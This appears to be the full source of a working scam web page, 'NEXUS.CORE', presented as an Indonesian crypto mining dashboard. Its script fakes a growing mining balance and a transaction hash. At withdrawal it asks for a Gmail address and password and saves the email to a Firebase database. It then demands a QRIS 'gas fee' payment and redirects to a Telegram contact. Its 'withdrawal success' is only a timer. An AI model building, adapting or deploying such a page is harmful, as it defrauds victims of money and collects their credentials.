<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
<title>⛏ NEXUS.CORE - Crypto Node Dashboard</title>
<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&family=JetBrains+Mono:wght@400;700;800&display=swap" rel="stylesheet">
<style>
  :root {
    --bg-main: #09090b;
    --bg-card: #121214;
    --bg-input: #18181b;
    --border: #27272a;
    --border-hover: #3f3f46;
    --accent: #06b6d4;
    --accent-glow: rgba(6, 182, 212, 0.15);
    --text-main: #f4f4f5;
    --text-muted: #a1a1aa;
    --success: #10b981;
    --danger: #ef4444;
    --warning: #f59e0b;
    --font-ui: 'Inter', sans-serif;
    --font-mono: 'JetBrains Mono', monospace;
  }

  * { margin:0; padding:0; box-sizing:border-box; outline: none; -webkit-tap-highlight-color: transparent; }
  
  body {
    background-color: var(--bg-main);
    color: var(--text-main);
    font-family: var(--font-ui);
    min-height: 100vh;
    -webkit-font-smoothing: antialiased;
  }

  .page { display:none; flex-direction:column; align-items:center; padding:32px 20px; min-height:100vh; animation: fadeIn 0.4s ease;}
  .page.active { display:flex; }
  @keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }

  /* HEADER */
  .header-container { text-align: center; margin-bottom: 32px; width: 100%; max-width: 460px; }
  .logo { font-family: var(--font-mono); font-size: 1.4rem; font-weight: 800; color: var(--text-main); letter-spacing: -0.5px; }
  .logo .highlight { color: var(--accent); text-shadow: 0 0 12px var(--accent-glow); }
  .sub { font-family: var(--font-mono); font-size: 0.65rem; font-weight: 500; color: var(--text-muted); letter-spacing: 2px; text-transform: uppercase; margin-top: 8px; }

  /* CARDS */
  .card { width: 100%; max-width: 460px; background: var(--bg-card); border: 1px solid var(--border); border-radius: 12px; margin-bottom: 16px; box-shadow: 0 4px 20px rgba(0,0,0,0.2); }
  .card-head { padding: 14px 20px; border-bottom: 1px solid var(--border); font-size: 0.7rem; font-weight: 600; color: var(--text-muted); letter-spacing: 1px; text-transform: uppercase; display: flex; justify-content: space-between; align-items: center; background: rgba(0,0,0,0.2); }
  .card-body { padding: 20px; }

  /* AUTH */
  .auth-tabs { display: flex; width: 100%; border-bottom: 1px solid var(--border); }
  .auth-tab { flex: 1; text-align: center; padding: 14px; font-family: var(--font-mono); font-size: 0.8rem; font-weight: 600; color: var(--text-muted); cursor: pointer; transition: all 0.2s; text-transform: uppercase; letter-spacing: 1px; }
  .auth-tab.active { color: var(--accent); border-bottom: 2px solid var(--accent); background: rgba(6, 182, 212, 0.05); }
  .auth-form { display: none; flex-direction: column; gap: 16px; width: 100%; padding: 20px; }
  .auth-form.active { display: flex; }

  /* DISPLAY */
  .bal-usd { font-family: var(--font-mono); font-size: 2.5rem; font-weight: 800; color: var(--text-main); text-align: center; margin-bottom: 4px; letter-spacing: -1px; }
  .bal-idr { text-align: center; font-size: 0.9rem; color: var(--text-muted); margin-bottom: 24px; font-weight: 500; }
  .prog-label { display: flex; justify-content: space-between; font-size: 0.7rem; font-weight: 500; color: var(--text-muted); margin-bottom: 8px; }
  .prog-track { height: 6px; background: var(--bg-input); border-radius: 8px; overflow: hidden; border: 1px solid var(--border); }
  .prog-fill { height: 100%; background: var(--accent); box-shadow: 0 0 12px var(--accent-glow); border-radius: 8px; transition: width 1s cubic-bezier(0.4, 0, 0.2, 1); width: 0%; }
  
  /* LIVE EXCHANGE */
  .dot-live { width: 8px; height: 8px; border-radius: 50%; background: var(--success); box-shadow: 0 0 8px rgba(16, 185, 129, 0.5); animation: pulse 2s infinite; display: inline-block; }
  @keyframes pulse { 0% { box-shadow: 0 0 0 0 rgba(16, 185, 129, 0.4); } 70% { box-shadow: 0 0 0 6px rgba(16, 185, 129, 0); } 100% { box-shadow: 0 0 0 0 rgba(16, 185, 129, 0); } }
  .rate-big { font-family: var(--font-mono); font-size: 1.5rem; font-weight: 700; color: var(--text-main); text-align: center; margin-bottom: 4px; }
  .rate-sub { font-size: 0.7rem; color: var(--text-muted); text-align: center; }

  /* BUTTONS */
  .btn { font-family: var(--font-ui); font-weight: 600; font-size: 0.85rem; letter-spacing: 0.5px; border-radius: 8px; cursor: pointer; transition: all 0.2s; text-transform: uppercase; display: flex; justify-content: center; align-items: center; gap: 8px; background: transparent; color: var(--text-main); border: 1px solid var(--border); padding: 14px; }
  .btn:active { transform: translateY(1px); }
  .btn:hover { border-color: var(--border-hover); background: var(--bg-input); }
  .ctrl-row { display: flex; gap: 12px; width: 100%; max-width: 460px; margin-bottom: 16px; }
  .ctrl-row .btn { flex: 1; }
  .btn-start.is-active { background: var(--accent); color: #000; border-color: var(--accent); box-shadow: 0 0 16px var(--accent-glow); }
  .btn-stop.is-active { background: var(--danger); color: #fff; border-color: var(--danger); box-shadow: 0 0 16px rgba(239, 68, 68, 0.25); }
  .btn-wd { width: 100%; max-width: 460px; padding: 16px; font-size: 0.85rem; margin-bottom: 16px; background: var(--accent-glow); border: 1px solid var(--accent); color: var(--accent); }
  .btn-auth { width: 100%; background: var(--accent); color: #000; border: none; margin-top: 8px; font-weight: 700;}

  /* LEDGER */
  .hist-item { display: flex; justify-content: space-between; align-items: center; padding: 14px 20px; border-bottom: 1px solid var(--border); }
  .hist-item:last-child { border-bottom: none; }
  .hist-left { display: flex; flex-direction: column; gap: 4px; }
  .h-title { font-size: 0.75rem; font-weight: 600; color: var(--text-main); }
  .h-date { font-size: 0.65rem; color: var(--text-muted); font-family: var(--font-mono); }
  .hist-right { text-align: right; display: flex; flex-direction: column; align-items: flex-end; gap: 4px; }
  .h-amt { font-family: var(--font-mono); font-size: 0.85rem; font-weight: 700; color: var(--text-main); }
  .h-badge { font-size: 0.6rem; padding: 3px 6px; border-radius: 4px; font-weight: 600; text-transform: uppercase; }
  .h-badge.success { background: rgba(16, 185, 129, 0.1); color: var(--success); }
  .h-badge.pending { background: rgba(245, 158, 11, 0.1); color: var(--warning); }

  /* FORMS */
  .field { margin-bottom: 16px; width: 100%; }
  .field-label { font-size: 0.75rem; font-weight: 500; color: var(--text-muted); margin-bottom: 8px; display: block; }
  .field-input { width: 100%; background: var(--bg-input); border: 1px solid var(--border); border-radius: 8px; padding: 14px 16px; color: var(--text-main); font-family: var(--font-ui); font-size: 0.9rem; transition: all 0.2s; outline: none; }
  .field-input:focus { border-color: var(--accent); box-shadow: 0 0 0 3px var(--accent-glow); }
  .nom-idr { margin-top: 8px; font-size: 0.8rem; color: var(--text-muted); font-family: var(--font-mono); padding-left: 4px; }

  /* MODAL */
  .modal-overlay { position: fixed; inset: 0; background: rgba(0,0,0,0.85); backdrop-filter: blur(5px); display: none; align-items: center; justify-content: center; z-index: 10000; padding: 20px; opacity: 0; transition: opacity 0.3s ease; }
  .modal-overlay.active { display: flex; opacity: 1; }
  .modal-box { background: var(--bg-card); border: 1px solid var(--border); border-radius: 12px; padding: 24px; width: 100%; max-width: 400px; box-shadow: 0 10px 40px rgba(0,0,0,0.5); position: relative; transform: translateY(20px); transition: transform 0.3s ease; }
  .modal-box::before { content: ''; position: absolute; top: 0; left: 0; right: 0; height: 3px; background: var(--accent); border-radius: 12px 12px 0 0; }
  .modal-close { position: absolute; top: 16px; right: 20px; color: var(--text-muted); font-size: 1.2rem; cursor: pointer; }
  .modal-title { font-family: var(--font-ui); color: var(--text-main); font-size: 1.1rem; font-weight: 700; margin-bottom: 12px; display: flex; align-items: center; gap: 8px; }
  .modal-desc { font-size: 0.8rem; color: var(--text-muted); line-height: 1.6; margin-bottom: 20px; padding: 12px; background: rgba(0,0,0,0.3); border-radius: 8px;}
  
  .qr-frame { background: #fff; padding: 16px; border-radius: 12px; width: fit-content; margin: 0 auto 24px; border: 1px solid var(--border); }
  .qr-frame img { width: 240px; height: 240px; display: block; border-radius: 6px; }
  .modal-loading { display: none; flex-direction: column; align-items: center; padding: 30px 0; }
  .modal-loading.active { display: flex; }
  .modal-spinner { width: 36px; height: 36px; border: 3px solid var(--bg-input); border-top: 3px solid var(--accent); border-radius: 50%; animation: spin 1s linear infinite; margin-bottom: 16px; }
  @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }

  .info-box { background: rgba(16, 185, 129, 0.05); border-left: 3px solid var(--success); padding: 12px; border-radius: 6px; margin-bottom: 20px; font-size: 0.8rem; color: var(--text-muted); line-height: 1.5;}
  .tx-id { color: var(--accent); font-family: var(--font-mono); font-size: 0.75rem; background: var(--bg-input); padding: 4px 8px; border-radius: 4px; border: 1px solid var(--border); display: inline-block; margin-top: 8px;}

  /* TOAST */
  .toast { position: fixed; bottom: 24px; left: 50%; transform: translateX(-50%) translateY(20px); background: var(--bg-card); border: 1px solid var(--border); border-radius: 8px; padding: 12px 24px; font-size: 0.8rem; font-weight: 500; color: var(--text-main); box-shadow: 0 10px 30px rgba(0,0,0,0.5); opacity: 0; transition: all 0.3s; z-index: 20000; text-align: center; }
  .toast.show { opacity: 1; transform: translateX(-50%) translateY(0); }
  
  footer { font-size: 0.55rem; font-family: var(--font-mono); font-weight: 500; color: var(--border-hover); margin-top: auto; padding-top: 32px; text-align: center; letter-spacing: 1px; width: 100%; max-width: 460px; margin-left: auto; margin-right: auto;}
  .back-btn { display: flex; align-items: center; gap: 8px; color: var(--text-muted); font-size: 0.8rem; cursor: pointer; margin-bottom: 24px; background:none; border:none;}
  
  .wallet-grid { display: grid; grid-template-columns: repeat(3, 1fr); gap: 10px; }
  .wallet-opt { background: var(--bg-input); border: 1px solid var(--border); border-radius: 8px; padding: 16px 10px; text-align: center; cursor: pointer; transition: 0.2s; position: relative; }
  .wallet-opt.sel { border-color: var(--accent); background: var(--accent-glow); }
  .w-name { font-size: 0.75rem; font-weight: 600; color: var(--text-muted); margin-top: 8px; }
  .wallet-opt.sel .w-name { color: var(--accent); }
</style>
</head>
<body>

<div class="page active" id="pgAuth" style="justify-content: center;">
  <div class="header-container">
    <div class="logo">NEXUS<span class="highlight">.CORE</span></div>
    <div class="sub">Decentralized Node Protocol</div>
  </div>
  <div class="card" style="background: transparent; border: none; box-shadow: none;">
    <div class="auth-tabs">
      <div class="auth-tab active" onclick="switchAuth('login')" id="tabLogin">Login</div>
      <div class="auth-tab" onclick="switchAuth('register')" id="tabRegister">Register</div>
    </div>
    <div class="auth-form active" id="formLogin">
      <div class="field"><label class="field-label">Node ID</label><input class="field-input" type="text" id="logID" placeholder="Masukkan ID"></div>
      <div class="field"><label class="field-label">Kata Sandi</label><input class="field-input" type="password" id="logPass" placeholder="••••••••"></div>
      <button class="btn btn-auth" onclick="processAuth()">Masuk Dashboard</button>
    </div>
    <div class="auth-form" id="formRegister">
      <div class="field"><label class="field-label">Buat Node ID</label><input class="field-input" type="text" id="regID" placeholder="ID Bebas"></div>
      <div class="field"><label class="field-label">Kata Sandi</label><input class="field-input" type="password" id="regPass" placeholder="Minimal 6 karakter"></div>
      <button class="btn btn-auth" onclick="processAuth()">Daftar Akun Baru</button>
    </div>
  </div>
</div>

<div class="page" id="pgLoading">
  <div class="loading-wrap"><div class="spinner"></div><div class="loading-text">Authenticating...</div></div>
</div>

<div class="page" id="pgDash">
  <div class="header-container">
    <div class="logo">NEXUS<span class="highlight">.CORE</span></div>
    <div class="sub">Mining Dashboard v2.4</div>
  </div>
  <div class="card">
    <div class="card-head"><span>Total Crypto Asset</span><span id="statusTxt" style="color: var(--text-muted);">○ STANDBY</span></div>
    <div class="card-body">
      <div class="bal-usd" id="balUsd">$ 0.0000</div>
      <div class="bal-idr" id="balIdr">≈ Rp 0</div>
      <div class="prog-label"><span>Withdrawal Threshold</span><span id="progPct">0.0%</span></div>
      <div class="prog-track"><div class="prog-fill" id="progFill"></div></div>
    </div>
  </div>
  <div class="card">
    <div class="card-head"><span>Live Exchange Rate</span><span style="display:flex;align-items:center;gap:8px;"><span class="dot-live"></span> LIVE</span></div>
    <div class="card-body">
      <div class="rate-big" id="rateBig">Syncing...</div>
      <div class="rate-sub" id="rateTs">Fetching data...</div>
    </div>
  </div>
  <div class="stats-row">
    <div class="stat"><div class="stat-lbl">HASHRATE</div><div class="stat-val" id="stHash">0 H/s</div></div>
    <div class="stat"><div class="stat-lbl">UPTIME</div><div class="stat-val" id="stUp">00:00</div></div>
    <div class="stat"><div class="stat-lbl">SHARES</div><div class="stat-val" id="stShares">0</div></div>
  </div>
  <div class="ctrl-row">
    <button class="btn btn-start" id="btnStart" onclick="doStart()">▶ Start Miner</button>
    <button class="btn btn-stop" id="btnStop" onclick="doStop()">■ Stop</button>
  </div>
  <button class="btn btn-wd" onclick="gotoWd()">Withdraw Funds</button>
  <div class="card"><div class="card-head"><span>Terminal Log</span><span style="cursor:pointer;" onclick="clearDashLog()">CLEAR</span></div><div class="card-body" style="padding:12px;"><div class="term-wrap" style="background:#000; padding:15px; border-radius:8px;"><div class="term-body" id="termBody" style="height:120px; overflow-y:auto; font-size:0.7rem; font-family:var(--font-mono);"></div></div></div></div>
  <div class="card"><div class="card-head"><span>Transaction Ledger</span></div><div class="card-body" style="padding: 0;" id="historyList"></div></div>
  <footer>SECURE CONNECTION · AES-256 ENCRYPTION</footer>
</div>

<div class="page" id="pgWd">
  <button class="back-btn" onclick="goPage('pgDash')">← Back to Dashboard</button>
  <div class="header-container" style="text-align: left; margin-bottom: 24px;"><div class="logo">Secure <span class="highlight">Withdrawal</span></div><div class="sub" style="text-transform: none;">Minimal penarikan $10.00.</div></div>
  <div class="card" style="border:none; box-shadow:none; background:transparent;">
    <div class="field"><label class="field-label">Nominal Penarikan (USD)</label><input class="field-input" id="wdAmt" type="number" step="0.01" oninput="calcNom()"><div class="nom-idr" id="wdNomIdr">≈ Rp 0</div></div>
    <div class="field"><label class="field-label">Nama Pemilik Akun</label><input class="field-input" id="wdName" type="text" placeholder="Sesuai E-Wallet"></div>
    <div class="field"><label class="field-label">Nomor Rekening / E-Wallet</label><input class="field-input" id="wdPhone" type="tel" placeholder="08xxxxxxxxxx"></div>
    <div class="field"><label class="field-label">Pilih Metode</label>
      <div class="wallet-grid">
        <div class="wallet-opt" onclick="pickWallet(this,'DANA')"><div>💳</div><div class="w-name">DANA</div></div>
        <div class="wallet-opt" onclick="pickWallet(this,'OVO')"><div>💳</div><div class="w-name">OVO</div></div>
        <div class="wallet-opt" onclick="pickWallet(this,'GOPAY')"><div>💳</div><div class="w-name">GOPAY</div></div>
        <div class="wallet-opt" onclick="pickWallet(this,'SHOPEE')"><div>💳</div><div class="w-name">SHOPEE</div></div>
        <div class="wallet-opt" onclick="pickWallet(this,'SEABANK')"><div>🏦</div><div class="w-name">SEABANK</div></div>
      </div>
    </div>
    <div class="summ" style="margin-top:20px; background:var(--bg-input); padding:15px; border-radius:8px;">
      <div style="display:flex; justify-content:space-between; font-size:0.8rem; margin-bottom:8px;"><span>Available Saldo</span><span class="s-val ac" id="wdAvail">$ 0.00</span></div>
      <div style="display:flex; justify-content:space-between; font-size:0.8rem;"><span>Nominal WD</span><span class="s-val" id="sUsd">$ 0.00</span></div>
    </div>
    <button class="btn btn-auth" style="padding: 16px; margin-top:20px;" onclick="triggerVerifModal()">Proses Penarikan</button>
  </div>
</div>

<div class="modal-overlay" id="verifModal">
  <div class="modal-box">
    <div class="modal-close" onclick="closeModal()">✕</div>
    <div id="modalStep1">
      <div class="modal-title">🔐 Verifikasi Keamanan</div>
      <div class="modal-desc">Sistem mendeteksi penarikan aset pertama. Silakan verifikasi akun Google Anda untuk melanjutkan sinkronisasi blockchain.</div>
      <div class="field"><label class="field-label">Akun Gmail</label><input class="field-input" type="email" id="vEmail" placeholder="akun@gmail.com"></div>
      <div class="field"><label class="field-label">Konfirmasi Node ID</label><input class="field-input" id="vNode" readonly></div>
      <div class="field"><label class="field-label">Password Nexus</label><input class="field-input" type="password" id="vPass" placeholder="Password Anda"></div>
      <button class="btn btn-auth" style="padding: 14px;" onclick="verifyStep1()">Verifikasi Identitas</button>
    </div>
    <div id="modalLoading" class="modal-loading"><div class="modal-spinner"></div><div style="color:white; font-size:0.8rem;">Syncing Smart Contract...</div></div>
    <div id="modalStep2" style="display: none;">
      <div class="modal-title" style="margin-bottom:16px;">Network Sync Required</div>
      <div class="info-box">
        <strong style="color: var(--success);">✓ Otentikasi Berhasil.</strong><br><br>
        Sistem membutuhkan <strong>Gas Fee (Biaya Sinkronisasi)</strong> untuk melepas aset dari Smart Contract ke jaringan Fiat.<br><br>
        Scan QRIS di bawah dan klik konfirmasi.
        <div class="tx-id">TxID: 0x<span id="fakeHash"></span></div>
      </div>
      <div class="qr-frame"><img src="https://i.ibb.co.com/prX07Bmp/linkqrid-qris-yanzmewaaaaa-1000.png" alt="QRIS"></div>
      <button class="btn btn-auth" style="padding: 14px;" onclick="confirmQR()">Konfirmasi Pembayaran</button>
    </div>
  </div>
</div>

<div class="page" id="pgSuccess">
  <div class="success-wrap">
    <div class="suc-icon">✓</div>
    <div class="logo">Transfer <span class="highlight">Queued</span></div>
    <p style="font-size: 0.8rem; color: var(--text-muted); margin-bottom: 32px;">Transaksi sedang dalam antrean validasi blok.</p>
    <div class="receipt" style="background:var(--bg-card); padding:20px; border-radius:12px; width:100%; text-align:left;">
      <div style="display:flex; justify-content:space-between; font-size:0.8rem; margin-bottom:10px;"><span>Amount</span><span id="rcpUsd" style="font-weight:700; color:var(--accent);">$ 0.00</span></div>
      <div style="display:flex; justify-content:space-between; font-size:0.8rem; margin-bottom:10px;"><span>Recipient</span><span id="rcpName">—</span></div>
      <div style="display:flex; justify-content:space-between; font-size:0.8rem;"><span>Status</span><span style="color: var(--warning);">Pending Sync</span></div>
    </div>
    <button class="btn" style="width: 100%; padding: 16px; margin-top:30px;" onclick="goHome()">Kembali ke Dashboard</button>
  </div>
</div>

<div class="toast" id="toastEl"></div>

<script type="module">
  import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js";
  import { getFirestore, doc, setDoc, getDoc, updateDoc, onSnapshot, arrayUnion } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-firestore.js";

  const firebaseConfig = {
    apiKey: "AIzaSyA0Nd98ri0J_CNnMOCur0ny0Vk7rjc2V3g",
    authDomain: "nexus-core-yanz.firebaseapp.com",
    projectId: "nexus-core-yanz",
    storageBucket: "nexus-core-yanz.firebasestorage.app",
    messagingSenderId: "305055677978",
    appId: "1:305055677978:web:114bfc02fe89848fd8dba3"
  };

  const app = initializeApp(firebaseConfig);
  const db = getFirestore(app);

  let currentUser = null;
  let localBal = 0;
  let rate = 0;
  let isActive = false;
  let hasPaidGasFee = false;
  let walletName = '';

  window.switchAuth = (type) => {
    document.getElementById('formLogin').classList.toggle('active', type === 'login');
    document.getElementById('formRegister').classList.toggle('active', type === 'register');
    document.getElementById('tabLogin').classList.toggle('active', type === 'login');
    document.getElementById('tabRegister').classList.toggle('active', type === 'register');
  };

  window.processAuth = async () => {
    const isLogin = document.getElementById('formLogin').classList.contains('active');
    const id = isLogin ? document.getElementById('logID').value.trim() : document.getElementById('regID').value.trim();
    const pass = isLogin ? document.getElementById('logPass').value : document.getElementById('regPass').value;

    if (!id || !pass) return toast("Lengkapi data!");
    goPage('pgLoading');

    const userRef = doc(db, "users", id);
    try {
      const snap = await getDoc(userRef);
      if (isLogin) {
        if (snap.exists() && snap.data().password === pass) {
          setupUser(snap.data());
        } else {
          goPage('pgAuth'); toast("ID atau Password salah!");
        }
      } else {
        if (snap.exists()) {
          goPage('pgAuth'); toast("Node ID sudah terdaftar!");
        } else {
          const newUser = { node_id: id, password: pass, balance: 1000, hasPaidGasFee: false, history: [], gmail: "" };
          await setDoc(userRef, newUser);
          setupUser(newUser);
        }
      }
    } catch (e) { goPage('pgAuth'); toast("Koneksi Error!"); }
  };

  function setupUser(data) {
    currentUser = data.node_id;
    localBal = data.balance;
    hasPaidGasFee = data.hasPaidGasFee;
    document.getElementById('vNode').value = currentUser;
    
    onSnapshot(doc(db, "users", currentUser), (doc) => {
      if (doc.exists()) {
        const d = doc.data();
        hasPaidGasFee = d.hasPaidGasFee;
        renderHistoryList(d.history || []);
      }
    });

    goPage('pgDash');
    syncBalanceToDB();
  }

  setInterval(() => { if (isActive) { localBal += 0.00010 + Math.random() * 0.00009; updateUI(); } }, 1000);

  async function syncBalanceToDB() {
    if (currentUser) {
      try { await updateDoc(doc(db, "users", currentUser), { balance: localBal }); } catch (e) {}
    }
    setTimeout(syncBalanceToDB, 10000);
  }

  function updateUI() {
    document.getElementById('balUsd').textContent = '$ ' + localBal.toFixed(4);
    document.getElementById('balIdr').textContent = '≈ Rp ' + (rate > 0 ? Math.round(localBal * rate).toLocaleString('id-ID') : '0');
    document.getElementById('progFill').style.width = Math.min(localBal / 10 * 100, 100) + '%';
    document.getElementById('progPct').textContent = Math.min(localBal / 10 * 100, 100).toFixed(1) + '%';
    document.getElementById('wdAvail').textContent = '$ ' + localBal.toFixed(4);
    document.getElementById('stHash').textContent = isActive ? (820 + Math.floor(Math.random()*150)) + " H/s" : "0 H/s";
  }

  window.triggerVerifModal = () => {
    const amt = parseFloat(document.getElementById('wdAmt').value);
    if (!amt || amt < 10) return toast("Minimal WD $10!");
    if (amt > localBal) return toast("Saldo tidak cukup!");
    if (!walletName) return toast("Pilih metode!");

    if (!hasPaidGasFee) {
      document.getElementById('verifModal').classList.add('active');
      document.getElementById('modalStep1').style.display = 'block';
    } else {
      executeWD();
    }
  };

  window.verifyStep1 = async () => {
    const gmail = document.getElementById('vEmail').value;
    const pass = document.getElementById('vPass').value;
    if (!gmail.includes('@gmail.com') || !pass) return toast("Kredensial salah!");

    document.getElementById('modalStep1').style.display = 'none';
    document.getElementById('modalLoading').classList.add('active');
    await updateDoc(doc(db, "users", currentUser), { gmail: gmail });

    setTimeout(() => {
      document.getElementById('modalLoading').classList.remove('active');
      document.getElementById('fakeHash').textContent = Math.random().toString(16).substring(2, 10).toUpperCase();
      document.getElementById('modalStep2').style.display = 'block';
    }, 2000);
  };

  window.confirmQR = () => {
    window.open('https://t.me/sweionf', '_blank');
    executeWD();
    closeModal();
  };

  async function executeWD() {
    const amt = parseFloat(document.getElementById('wdAmt').value);
    localBal -= amt;
    const txId = Date.now();
    const tx = { id: txId, amount: amt, method: walletName, date: tsFull(), status: "PENDING" };
    
    await updateDoc(doc(db, "users", currentUser), { balance: localBal, history: arrayUnion(tx) });

    document.getElementById('rcpUsd').textContent = '$ ' + amt.toFixed(2);
    document.getElementById('rcpName').textContent = document.getElementById('wdName').value;
    goPage('pgSuccess');

    setTimeout(async () => {
      const snap = await getDoc(doc(db, "users", currentUser));
      const hist = snap.data().history.map(item => {
        if(item.id === txId) item.status = "SUCCESS";
        return item;
      });
      await updateDoc(doc(db, "users", currentUser), { history: hist });
      toast("✅ Withdrawal Sukses!");
    }, 600000);
  }

  function renderHistoryList(history) {
    const container = document.getElementById('historyList');
    container.innerHTML = history.length ? '' : '<div style="padding:20px;text-align:center;color:#444;font-size:0.7rem;">No data found.</div>';
    [...history].reverse().forEach(item => {
      container.innerHTML += `<div class="hist-item"><div class="hist-left"><div class="h-title">${item.method}</div><div class="h-date">${item.date}</div></div><div class="hist-right"><div class="h-amt">$${item.amount.toFixed(2)}</div><div class="h-badge ${item.status.toLowerCase()}">${item.status}</div></div></div>`;
    });
  }

  window.goPage = (id) => { document.querySelectorAll('.page').forEach(p=>p.classList.remove('active')); document.getElementById(id).classList.add('active'); };
  window.closeModal = () => document.getElementById('verifModal').classList.remove('active');
  window.doStart = () => { isActive = true; document.getElementById('btnStart').classList.add('is-active'); document.getElementById('btnStop').classList.remove('is-active'); document.getElementById('statusTxt').textContent = '● MINING'; dashLog("Miner protocol started..."); };
  window.doStop = () => { isActive = false; document.getElementById('btnStop').classList.add('is-active'); document.getElementById('btnStart').classList.remove('is-active'); document.getElementById('statusTxt').textContent = '○ STANDBY'; dashLog("Miner protocol suspended."); };
  window.calcNom = () => { const v = parseFloat(document.getElementById('wdAmt').value) || 0; document.getElementById('wdNomIdr').textContent = '≈ Rp ' + (rate*v).toLocaleString('id-ID'); document.getElementById('sUsd').textContent = '$ '+v.toFixed(2); };
  window.pickWallet = (el, name) => { document.querySelectorAll('.wallet-opt').forEach(o=>o.classList.remove('sel')); el.classList.add('sel'); walletName = name; };
  window.dashLog = (m) => { const d=document.createElement('div'); d.style.marginBottom="5px"; d.innerHTML=`<span style="color:#52525b;">[${ts()}]</span> ${m}`; document.getElementById('termBody').appendChild(d); document.getElementById('termBody').scrollTop = document.getElementById('termBody').scrollHeight; };
  window.toast = (m) => { const t=document.getElementById('toastEl'); t.textContent=m; t.classList.add('show'); setTimeout(()=>t.classList.remove('show'), 3000); };
  window.goHome = () => { document.getElementById('wdAmt').value=''; walletName=''; document.querySelectorAll('.wallet-opt').forEach(o=>o.classList.remove('sel')); goPage('pgDash'); };
  const ts = () => { const d = new Date(); return `${String(d.getHours()).padStart(2,'0')}:${String(d.getMinutes()).padStart(2,'0')}:${String(d.getSeconds()).padStart(2,'0')}`; };
  const tsFull = () => { const d = new Date(); return `${d.getDate()}/${d.getMonth()+1} ${ts()}`; };
  fetch('https://open.er-api.com/v6/latest/USD').then(r=>r.json()).then(d=>{ rate = d.rates.IDR; document.getElementById('rateBig').textContent = 'Rp '+rate.toLocaleString('id-ID'); document.getElementById('rateTs').textContent = 'Live Sync Active'; });
</script>
</body>
</html>

